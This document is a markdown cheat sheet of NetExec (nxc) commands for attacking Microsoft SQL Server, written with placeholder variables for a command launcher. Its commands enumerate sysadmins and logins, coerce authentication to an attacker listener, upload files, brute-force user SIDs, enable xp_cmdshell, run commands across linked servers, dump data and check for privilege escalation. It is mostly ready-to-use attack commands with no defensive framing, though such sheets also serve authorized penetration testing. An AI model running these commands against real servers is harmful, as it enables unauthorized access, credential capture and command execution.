# NetExec MSSQL

## nxc mssql

### MSSQL Query

Enumerate MSSQL query with NetExec MSSQL.

```sh title:"NetExec MSSQL Enumerate MSSQL Query"
nxc mssql $domain -u $user $auth_flags -q $query
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var query
-->

### MSSQL sysadmin members

Find MSSQL sysadmin members with NetExec MSSQL.

```sh title:"NetExec MSSQL Find MSSQL Sysadmin Members"
nxc mssql $domain -u $user $auth_flags -q "EXEC sp_helpsrvrolemember 'sysadmin';"
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### MSSQL logins

Find MSSQL logins with NetExec MSSQL.

```sh title:"NetExec MSSQL Find MSSQL Logins"
nxc mssql $domain -u $user $auth_flags -M enum_logins
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### MSSQL Coercion

Trigger MSSQL coercion with NetExec MSSQL.

```sh title:"NetExec MSSQL Trigger MSSQL Coercion"
nxc mssql $domain -u $user $auth_flags -M mssql_coerce -o LISTENER=$lhost
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var lhost
-->

### MSSQL databases

Run MSSQL databases with NetExec MSSQL.

```sh title:"NetExec MSSQL Run MSSQL Databases"
nxc mssql $domain -u $user $auth_flags -q 'SELECT name FROM master.dbo.sysdatabases;'
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### Upload file to remote host

Upload file to remote host with NetExec MSSQL.

```sh title:"NetExec MSSQL Upload File to Remote Host"
nxc mssql $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var local_file_path
var remote_file_path
-->

### Get user SIDs via MSSQL

List user SIDs via MSSQL with NetExec MSSQL.

```sh title:"NetExec MSSQL List User SIDs Via MSSQL"
nxc mssql $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->


## nxc mssql modules

### enum_impersonate

List enum impersonate with NetExec MSSQL.

```sh title:"NetExec MSSQL List Enum Impersonate"
nxc mssql $domain -u $user $auth_flags -M enum_impersonate
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### enum_links

Enumerate enum links with NetExec MSSQL.

```sh title:"NetExec MSSQL Enumerate Enum Links"
nxc mssql $domain -u $user $auth_flags -M enum_links
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### mssql_cbt

Check MSSQL cbt with NetExec MSSQL.

```sh title:"NetExec MSSQL Check MSSQL Cbt"
nxc mssql $domain -u $user $auth_flags -M mssql_cbt
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### mssql_dumper

Dump MSSQL dumper with NetExec MSSQL.

```sh title:"NetExec MSSQL Dump MSSQL Dumper"
nxc mssql $domain -u $user $auth_flags -M mssql_dumper
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### enable_cmdshell

Start enable cmdshell with NetExec MSSQL.

```sh title:"NetExec MSSQL Start Enable Cmdshell"
nxc mssql $domain -u $user $auth_flags -M enable_cmdshell -o ACTION=enable
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### exec_on_link

Start exec on link with NetExec MSSQL.

```sh title:"NetExec MSSQL Start Exec on Link"
nxc mssql $domain -u $user $auth_flags -M exec_on_link -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
var cmd
-->

### link_enable_cmdshell

Start link enable cmdshell with NetExec MSSQL.

```sh title:"NetExec MSSQL Start Link Enable Cmdshell"
nxc mssql $domain -u $user $auth_flags -M link_enable_cmdshell -o LINK=$link ACTION=enable
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
-->

### link_xpcmd

Start link xpcmd with NetExec MSSQL.

```sh title:"NetExec MSSQL Start Link Xpcmd"
nxc mssql $domain -u $user $auth_flags -M link_xpcmd -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
var cmd
-->

### mssql_priv

Enumerate MSSQL priv with NetExec MSSQL.

```sh title:"NetExec MSSQL Enumerate MSSQL Priv"
nxc mssql $domain -u $user $auth_flags -M mssql_priv
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

